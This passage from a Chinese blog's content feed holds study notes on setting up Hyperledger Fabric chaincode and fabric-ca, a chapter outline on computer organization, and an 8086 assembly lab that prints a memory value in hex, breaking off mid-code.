class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、给节点安装智能合约"><a href="#3、给节点安装智能合约" class="headerlink" title="3、给节点安装智能合约"></a>3、给节点安装智能合约</h3><pre class="line-numbers language-shell"><code class="language-shell">peer chaincode install -n 链码的名字 -v 链码的版本 -l 链码的语言 -p 链码的位置# 链码的名字自己起# 链码的版本 ，自己指定peer chaincode install -n firstcc -v 1.0 -l golang -p github.com/chaincode/sick<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-更新锚节点"><a href="#3-1-更新锚节点" class="headerlink" title="3.1 更新锚节点"></a>3.1 更新锚节点</h3><pre class="line-numbers language-shell"><code class="language-shell">peer channel update -o orderer节点地址:端口 -c 通道名 -f 锚节点更新文件 --tls true --cafile orderer节点pem格式证书的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、链码的初始化"><a href="#4、链码的初始化" class="headerlink" title="4、链码的初始化"></a>4、链码的初始化</h3><pre class="line-numbers language-shell"><code class="language-shell">peer chaincode instantiate -o orderer节点地址:端口 --tls true --cafile order节点pem格式的证书文件 -C 通道名称 -n 链码名称 -l 链码语言 -v 链码版本 -c 链码Init函数的调用 -p 背书策略# -n链码名称和 安装的时候-n 的名字要一样# -v 链码的版本， 和安装时候的-v 链码版本一致# 排序端口7050<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建通道的操作只要登录到客户端容器中就可以操作</p><h3 id="5、peer0-OrgGo的操作"><a href="#5、peer0-OrgGo的操作" class="headerlink" title="5、peer0.OrgGo的操作"></a>5、peer0.OrgGo的操作</h3><ul><li>要保证客户端操作的是peer0.OrgGo<ul><li>使用 echo  $CORE_PEER_ADDRESS</li></ul></li><li>将当前的节点加入到通道中<ul><li>peer channel join -b xx.block</li></ul></li><li>安装链码<ul><li>peer chaincode install {flags}</li></ul></li><li>链代码的初始化  — &gt; 只需要做一次<ul><li>peer chaincode instantiate {flag}</li></ul></li><li>查询调用</li></ul><h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><ul><li>链代码的报名的指定</li></ul><pre class="line-numbers language-go"><code class="language-go"><span class="token comment" spellcheck="true">//  xxx.go</span><span class="token keyword">package</span> main <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>必须引入的包</li></ul><pre class="line-numbers language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//客户端需要和Fabric框架通信 "github.com/hyperledger/fabric/core/chaincode/shim        pb  "github.com/hyperledger/fabric/protos/peer"</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>链码的书写要求</li></ul><pre class="line-numbers language-go"><code class="language-go"><span class="token comment" spellcheck="true">//自定义结构体，类，基于这个实现一些接口函数</span><span class="token keyword">type</span> Test <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//空着即可</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>t<span class="token operator">*</span> Test<span class="token punctuation">)</span><span class="token function">Init</span><span class="token punctuation">(</span>stub ChaincodeStubInterface<span class="token punctuation">)</span> pb<span class="token punctuation">.</span>Response<span class="token keyword">func</span> <span class="token punctuation">(</span>t<span class="token operator">*</span> Test<span class="token punctuation">)</span><span class="token function">Invoke</span><span class="token punctuation">(</span>stub ChaincodeStubInterface<span class="token punctuation">)</span> pb<span class="token punctuation">.</span>Response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>shim包的核心方法</p><pre class="line-numbers language-go"><code class="language-go"><span class="token comment" spellcheck="true">//方法定义</span><span class="token keyword">func</span> <span class="token function">Success</span> <span class="token punctuation">(</span>payload <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> pb<span class="token punctuation">.</span>REsponse<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//实例代码</span><span class="token keyword">func</span> <span class="token punctuation">(</span>t <span class="token operator">*</span>TestStudy<span class="token punctuation">)</span> <span class="token function">Invoke</span><span class="token punctuation">(</span>stub shim<span class="token punctuation">.</span>ChaincodeStubInterface<span class="token punctuation">)</span> pb<span class="token punctuation">.</span>Response<span class="token punctuation">{</span>    <span class="token keyword">return</span> shim<span class="token punctuation">.</span><span class="token function">Success</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">byte</span> <span class="token punctuation">(</span><span class="token string">"okok"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fabric-CA-动态注册账号"><a href="#fabric-CA-动态注册账号" class="headerlink" title="fabric CA 动态注册账号"></a>fabric CA 动态注册账号</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20220305122438737.png" alt="image-20220305122438737"></p><p>上图中，Fabric提供了两种方式调用server服务</p><ul><li>通过Fabric-Client调用</li><li>通过SDK调用</li></ul><p>通常一个组织对应一个Fabric-server服务器</p><p>关于fabric-ca的部署</p><ul><li>要在每个组织中部署一个fabric-ca服务器，给当前组织注册新用户</li></ul><pre class="line-numbers language-yaml"><code class="language-yaml"> <span class="token key atrule">ca.example.com</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> hyperledger/fabric<span class="token punctuation">-</span>ca    <span class="token key atrule">environment</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#fabric-ca容器中的home目录</span>      <span class="token punctuation">-</span> FABRIC_CA_HOME=/etc/hyperledger/fabric<span class="token punctuation">-</span>ca<span class="token punctuation">-</span>server      <span class="token comment" spellcheck="true">#fabric-ca服务器的名字，自己起</span>      <span class="token punctuation">-</span> FABRIC_CA_SERVER_CA_NAME=ca.example.com      <span class="token comment" spellcheck="true">#fabricca服务器证书文件</span>      <span class="token punctuation">-</span> FABRIC_CA_SERVER_CA_CERTFILE=/etc/hyperledger/fabric<span class="token punctuation">-</span>ca<span class="token punctuation">-</span>server<span class="token punctuation">-</span>config/ca.org1.example.com<span class="token punctuation">-</span>cert.pem      <span class="token comment" spellcheck="true">#私钥文件</span>      <span class="token punctuation">-</span> FABRIC_CA_SERVER_CA_KEYFILE=/etc/hyperledger/fabric<span class="token punctuation">-</span>ca<span class="token punctuation">-</span>server<span class="token punctuation">-</span>config/4239aa0dcd76daeeb8ba0cda701851d14504d31aad1b2ddddbac6a57365e497c_sk      <span class="token comment" spellcheck="true">#端口，不需要改</span>    <span class="token key atrule">ports</span><span class="token punctuation">:</span>       <span class="token punctuation">-</span> <span class="token string">"7054:7054"</span>     <span class="token comment" spellcheck="true">#admin:adminpw ==> 账号和密码，登陆后才能注册</span>    <span class="token key atrule">command</span><span class="token punctuation">:</span> sh <span class="token punctuation">-</span>c 'fabric<span class="token punctuation">-</span>ca<span class="token punctuation">-</span>server start <span class="token punctuation">-</span>b admin<span class="token punctuation">:</span>adminpw'    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./crypto<span class="token punctuation">-</span>config/peerOrganizations/org1.example.com/ca/<span class="token punctuation">:</span>/etc/hyperledger/fabric<span class="token punctuation">-</span>ca<span class="token punctuation">-</span>server<span class="token punctuation">-</span>config      <span class="token comment" spellcheck="true">#容器名</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> ca.example.com    <span class="token comment" spellcheck="true">#工作网络</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> basic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="11"><a href="#11" class="headerlink" title="11"></a>11</h1><pre class="line-numbers language-shell"><code class="language-shell">#进入cli客户端docker exec -it cli /bin/bash  #安装智能合约peer chaincode install -n basicinfo -v 1.0 -l golang -p github.com/chaincode/sickpeer chaincode install -n testFood -v 1.0 -l golang -p github.com/chaincode/testpeer chaincode install -n recode -v 1.0 -l golang -p github.com/chaincode/recodepeer chaincode install -n testFood -v 3.0 -l golang -p github.com/chaincode/test#查看peer上的智能合约peer chaincode list --installed#实例化合约peer chaincode instantiate -o orderer.haozai.com:7050 --tls --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/haozai.com/orderers/orderer.haozai.com/msp/tlscacerts/tlsca.haozai.com-cert.pem -C haozaichannel -n basicinfo -v 1.0 -c '{"Args":["init"]}' -P "OR ('Org1MSP.member')"peer chaincode instantiate -o orderer.haozai.com:7050 --tls --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/haozai.com/orderers/orderer.haozai.com/msp/tlscacerts/tlsca.haozai.com-cert.pem -C haozaichannel -n recodeinfo -v 1.0 -c '{"Args":["init"]}' -P "OR ('OrgCppMSP.member')"peer chaincode instantiate -o orderer.food.com:7050 --tls --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/food.com/orderers/orderer.food.com/msp/tlscacerts/tlsca.food.com-cert.pem -C foodfchannel -n testFood -v 2.0 -c '{"Args":["init"]}' -P "OR ('Org1MSP.member')"#查看合约是否实例化完成peer chaincode list --instantiated -C haozaichannelpeer chaincode list --instantiated -C foodfchannel#触发合约peer chaincode invoke -o orderer.haozai.com:7050  -C haozaichannel -n basicinfo  --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/haozai.com/orderers/orderer.haozai.com/msp/tlscacerts/tlsca.haozai.com-cert.pem --peerAddresses peer1.orgcpp.haozai.com:10051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/peers/peer0.orgcpp.haozai.com/tls/ca.crt -c '{"Args":["save","110115","{\"name\":\"zhangsan\",\"identity\":\"110114\",\"mobile\":\"18910012222\"}"]}'#查询数据是否写入区块peer chaincode query -C haozaichannel -n basicinfo -c '{"Args":["query","110115"]}'#查询peer chaincode invoke -o orderer.food.com:7050  -C foodfchannel -n testFood  --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/food.com/orderers/orderer.food.com/msp/tlscacerts/tlsca.food.com-cert.pem --peerAddresses peer0.org1.food.com:7051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.food.com/peers/peer0.org1.food.com/tls/ca.crt -c '{"Args":["commdityAdd","1","{\"ID\":\"1\",\"CommodityName\":\"test\",\"CommodityProduceTime\":\"2022-10-20\",\"SaveTime\":\"30天\",\"CommodityFactory\":\"AB\",\"CommodityAd\":\"北京\",\"TransT\":\"2000-10-02\",\"TransName\":\"菜鸟\",\"TransPeople\":\"xiaoming\",\"TransTime\":\"3天\",\"SoldAd\":\"铜陵\",\"SoldMarket\":\"大嘻嘻嘻\"，\"SoldPrice\":\"30\"}"]}'peer chaincode invoke -o orderer.food.com:7050  -C foodfchannel -n testFood  --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/food.com/orderers/orderer.food.com/msp/tlscacerts/tlsca.food.com-cert.pem --peerAddresses peer0.org1.food.com:7051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.food.com/peers/peer0.org1.food.com/tls/ca.crt -c '{"Args":["commdityAdd","1","{\"ID\":\"1\",\"CommodityName\":\"test\",\"CommodityProduceTime\":\"2022-10-20\",\"SaveTime\":\"30天\",\"CommodityFactory\":\"AB\",\"CommodityAd\":\"北京\",\"TransT\":\"2000-10-02\",\"TransName\":\"菜鸟\",\"TransPeople\":\"xiaoming\",\"TransTime\":\"3天\",\"SoldAd\":\"铜陵\",\"SoldMarket\":\"大嘻嘻嘻\,\"SoldPrice\":\"30\"}"]}'peer chaincode invoke -o orderer.food.com:7050  -C foodfchannel -n testFood  --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/food.com/orderers/orderer.food.com/msp/tlscacerts/tlsca.food.com-cert.pem --peerAddresses peer0.org1.food.com:7051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.food.com/peers/peer0.org1.food.com/tls/ca.crt -c '{"Args":["commdityAdd","5","{\"id\":\"5\",\"commodityName\":\"SDKtest\",\"commodityProduceTime\":\"2022-10-20\",\"saveTime\":\"30天\",\"commodityFactory\":\"JavaSDK\",\"commodityAd\":\"北京SDK\",\"transT\":\"2000-10-02\",\"transName\":\"菜鸟\",\"transPeople\":\"xiaoming\",\"transTime\":\"100000\",\"soldAd\":\"铜陵\",\"soldMarket\":\"大嘻嘻嘻\",\"soldPrice\":\"30\"}"]}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看链上的数据</p><p>​查看区块长度</p><p>​peer channel getinfo -c haozaichannel</p><p>peer channel   fetch newest channel-artifacts/new.pb -c haozaichannel  </p><pre class="line-numbers language-shell"><code class="language-shell">#安装合约peer chaincode install -n recodeinfo -v 4.0 -l golang -p github.com/chaincode/recodepeer chaincode install -n testFood -v 4.0 -l golang -p github.com/chaincode/test#合约升级peer chaincode upgrade -o orderer.food.com:7050 --tls --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/food.com/orderers/orderer.food.com/msp/tlscacerts/tlsca.food.com-cert.pem -C foodfchannel -n testFood -v 4.0 -c '{"Args":["init"]}' -P "OR ('Org1MSP.member')"peer chaincode upgrade -o orderer.food.com:7050 --tls --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/food.com/orderers/orderer.food.com/msp/tlscacerts/tlsca.food.com-cert.pem -C foodfchannel -n injectRecode -v 3.0 -c '{"Args":["init"]}' -P "OR ('Org1MSP.member')"#触发合约peer chaincode invoke -o orderer.haozai.com:7050  -C haozaichannel -n recodeinfo  --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/haozai.com/orderers/orderer.haozai.com/msp/tlscacerts/tlsca.haozai.com-cert.pem --peerAddresses peer1.orgcpp.haozai.com:10051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/orgcpp.haozai.com/peers/peer1.orgcpp.haozai.com/tls/ca.crt -c '{"Args":["save","110115","{\"sickName\":\"gm\",\"identity\":\"110114\",\"drugName\":[\"888\"]}"]}'#查询peer chaincode query -C haozaichannel -n recodeinfo -c '{"Args":["queryhistory","110115"]}'peer chaincode query -C foodfchannel -n injectRecode -c '{"Args":["queryInfoById","ea48576f30be1669971699c09ad05c94"]}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20220306163551595.png" alt="image-20220306163551595"></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>略！，等学完这门课，在进行自己对这门课的总结和看法</p><h1 id="第一章：基础知识"><a href="#第一章：基础知识" class="headerlink" title="第一章：基础知识"></a>第一章：基础知识</h1><h2 id="一、计算机发展历程"><a href="#一、计算机发展历程" class="headerlink" title="一、计算机发展历程"></a>一、计算机发展历程</h2><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174157513.png" alt="image-20220127174157513"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174207363.png" alt="image-20220127174207363"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174221279.png" alt="image-20220127174221279"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174257731.png" alt="image-20220127174257731"></p><p><strong>机器字长：计算机 一次整数运算所能 处理的二进制位数</strong></p><h2 id="二、摩尔定律"><a href="#二、摩尔定律" class="headerlink" title="二、摩尔定律"></a>二、摩尔定律</h2><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174407604.png" alt="image-20220127174407604"></p><h2 id="三、总结："><a href="#三、总结：" class="headerlink" title="三、总结："></a>三、总结：</h2><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174431224.png" alt="image-20220127174431224"></p><h2 id="计算机硬件的基本组成"><a href="#计算机硬件的基本组成" class="headerlink" title="计算机硬件的基本组成"></a>计算机硬件的基本组成</h2><h3 id="一、冯诺依曼结构"><a href="#一、冯诺依曼结构" class="headerlink" title="一、冯诺依曼结构"></a>一、冯诺依曼结构</h3><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174617403.png" alt="image-20220127174617403"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174639802.png" alt="image-20220127174639802"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174647669.png" alt="image-20220127174647669"></p><h3 id="二、现代计算机结构"><a href="#二、现代计算机结构" class="headerlink" title="二、现代计算机结构"></a>二、现代计算机结构</h3><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174719179.png" alt="image-20220127174719179"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174755656.png" alt="image-20220127174755656"></p><h2 id="各个硬件的工作原理"><a href="#各个硬件的工作原理" class="headerlink" title="各个硬件的工作原理"></a>各个硬件的工作原理</h2><h3 id="一、主存储器"><a href="#一、主存储器" class="headerlink" title="一、主存储器"></a>一、主存储器</h3><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174849403.png" alt="image-20220127174849403"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174904421.png" alt="image-20220127174904421"></p><h3 id="二、运算器的基本组成"><a href="#二、运算器的基本组成" class="headerlink" title="二、运算器的基本组成"></a>二、运算器的基本组成</h3><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127174956061.png" alt="image-20220127174956061"></p><h3 id="三、控制器的基本组成"><a href="#三、控制器的基本组成" class="headerlink" title="三、控制器的基本组成"></a>三、控制器的基本组成</h3><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175029117.png" alt="image-20220127175029117"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175137079.png" alt="image-20220127175137079"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175145174.png" alt="image-20220127175145174"></p><h2 id="计算机系统的多级层次结构"><a href="#计算机系统的多级层次结构" class="headerlink" title="计算机系统的多级层次结构"></a>计算机系统的多级层次结构</h2><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175232946.png" alt="image-20220127175232946"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175244947.png" alt="image-20220127175244947"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175302534.png" alt="image-20220127175302534"></p><h2 id="计算机性能指标"><a href="#计算机性能指标" class="headerlink" title="计算机性能指标"></a>计算机性能指标</h2><h2 id="一、主存的性能指标"><a href="#一、主存的性能指标" class="headerlink" title="一、主存的性能指标"></a>一、主存的性能指标</h2><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175411900.png" alt="image-20220127175411900"></p><h2 id="二、CPU的性能指标"><a href="#二、CPU的性能指标" class="headerlink" title="二、CPU的性能指标**"></a>二、CPU的性能指标**</h2><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175442955.png" alt="image-20220127175442955"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175500002.png" alt="image-20220127175500002"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175511101.png" alt="image-20220127175511101"></p><h2 id="三、系统总体的性能指标"><a href="#三、系统总体的性能指标" class="headerlink" title="三、系统总体的性能指标"></a>三、系统总体的性能指标</h2><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175534234.png" alt="image-20220127175534234"></p><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175556109.png" alt="image-20220127175556109"></p><h2 id="A-amp-Q"><a href="#A-amp-Q" class="headerlink" title="A&amp;Q"></a>A&amp;Q</h2><p><img src="/2022/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/blog\hexoblog\source_posts\计算机组成原理\image-20220127175549993.png" alt="image-20220127175549993"></p><h2 id="第一章习题：）"><a href="#第一章习题：）" class="headerlink" title="第一章习题：）"></a>第一章习题：）</h2><p>1、冯诺依曼计算机的最主要特点是： 存储程序方式</p><p>待补充…</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编实验总结</title>
      <link href="/2021/12/04/%E6%B1%87%E7%BC%96%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
      <url>/2021/12/04/%E6%B1%87%E7%BC%96%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="文章背景"><a href="#文章背景" class="headerlink" title="文章背景"></a>文章背景</h1><p>在此之前只是听说汇编苦涩难懂，但是没有接触过。直到大三学了微机原理与接口技术，但是这本书并不是纯汇编，还有8086的一些原理以及模电数电等等。</p><p>总体来说，上课听课只是从大的方向了解，但是很多细节都没注意，所以每次的实验认真完成，一方面可以复习学过的，一方面在不断的积累经验。：）</p><h1 id="实验一：根据内存数据回显不同结果"><a href="#实验一：根据内存数据回显不同结果" class="headerlink" title="实验一：根据内存数据回显不同结果"></a>实验一：根据内存数据回显不同结果</h1><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><pre class="line-numbers language-assembly"><code class="language-assembly">;这段代码是如果内存数据是负数，就在屏幕显示-1（FFH），如果是0就显示00h , 如果是正数就显示01hdata segment        varx db -25    vary db ?    data endsstack segmentstack endscode segment    assume cs:code,ds:data,ss:stackstart:    mov ax, data ;    mov ds, ax    MOV AL, VARX ;al = -25    CMP AL,0  ; cf = 0 , zf = 0 ,sf=1 ,of = 0    JGE NEXT ; >= 的时候跳转 即sf=of ，这里不跳转 ,也就是此时al 是负数    MOV AL,0FFH ;al = ff ,-1的8位补码    JMP halt NEXT:    ;当varx>=0的时候跳转过来    JE ZERO0  ; zf = 1 也就是varx=0    MOV AL,1 ;al =1    JMP haltZERO0:     MOV AL,0 ; al = 0; =====================halt halt:     mov vary,al ; 把al赋值 给vary    mov dl,vary ; 使用dl 操作vary 保留vary 不变    MOV CL,4     ROR DL,CL  ;右移4位    AND DL,0FH ; 高四位置0 ，此时的低四位是原数据的高四位    CMP DL,0AH ; 判断是否大于a    jb  NUA ; 当dl < a的时候跳转到nua直接将高位显示    ;若高四位的值 >= a ， 假设是 A=10  , 则需要+7 ->  11h + 30h = 64d ->A    add dl,7 ;================halt endNUA:    ADD DL,30H ; 把数字转换成相应的字符    MOV AH,2  ;2号调用，显示高四位字符    INT 21H    MOV DL,VARY ;  dl =  vary    AND DL,0fH  ;此时取低四位    CMP DL,0AH  ;比较低四位，若低四位 < a 则跳转到nub    JB NUB     ADD DL,7  ;同样若>a，需要+7 NUB:    ADD DL,30H     MOV AH,2    INT 21H    MOV DL,'h' ;显示h    MOV AH,2    INT 21H    mov ah,4ch; 退出程序    int 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="提取代码块"><a href="#提取代码块" class="headerlink" title="提取代码块"></a>提取代码块</h2><p>屏幕上显示数据，这个功能很常用，因此我们可以把它提取出来，方便以后直接使用。</p><pre class="line-numbers language-assembly"><code class="language-assembly">halt:     ;此时vary是我们希望在屏幕上显示的字符。    mov dl,vary ; 使用dl 操作vary 保留vary 不变    MOV CL,4     ROR DL,CL  ;右移4位    AND DL,0FH ; 高四位置0 ，此时的低四位是原数据的高四位    CMP DL,0AH ; 判断是否大于a    jb  NUA ; 当dl < a的时候跳转到nua直接将高位显示    ;若高四位的值 >= a ， 假设是 A=10  , 则需要+7 